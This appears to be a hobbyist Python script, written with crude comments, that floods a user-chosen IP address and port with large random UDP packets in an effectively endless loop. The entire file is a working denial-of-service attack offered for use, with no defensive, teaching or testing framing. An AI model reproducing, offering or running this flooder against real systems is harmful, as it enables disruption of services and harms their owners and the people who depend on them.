# bruh creating a DoS script is easy AF
# importing random shit
import socket, random, os

# this create a banner
os.system('clear')
os.system('toilet -f term --filter metal -w 40 Dinal of Servise | cowsay -f eyes | lolcat')

# i don't now what the fu3k is this
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# input aaa
ip = input("Enter Target >>>")
port = int(input("Enter Target's port >>>"))

# understand this by yourself
s.connect((ip, port))

# ..... i am not explaining this
for i in range(1, 100**1000):
  s.send(random._urandom(10)*1000)
  print(f"{i} packets sent!", end='\r')


